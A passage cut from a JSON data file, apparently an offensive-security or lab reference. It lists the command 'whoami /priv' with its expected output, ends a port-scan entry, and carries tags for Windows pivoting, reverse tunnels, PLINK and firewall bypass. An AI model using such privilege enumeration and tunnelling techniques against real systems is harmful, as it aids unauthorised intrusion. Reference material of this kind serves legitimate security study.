              "shows": "PORT STATE SERVICE"
            },
            {
              "id": "whoami-priv",
              "example": "whoami /priv",
              "shows": "Privilege Name column lists available privileges"
            }
          ]
        }
      ],
      "tags": [
        "WINDOWS",
        "PORT_FORWARDING",
        "PIVOTING",
        "SSH",
        "PLINK",
        "NETSH",
        "RDP",
        "OPENSSH",
        "FIREWALL_BYPASS",
        "REVERSE_TUNNEL",
        "ADMIN"
      ]
    }
  ]
}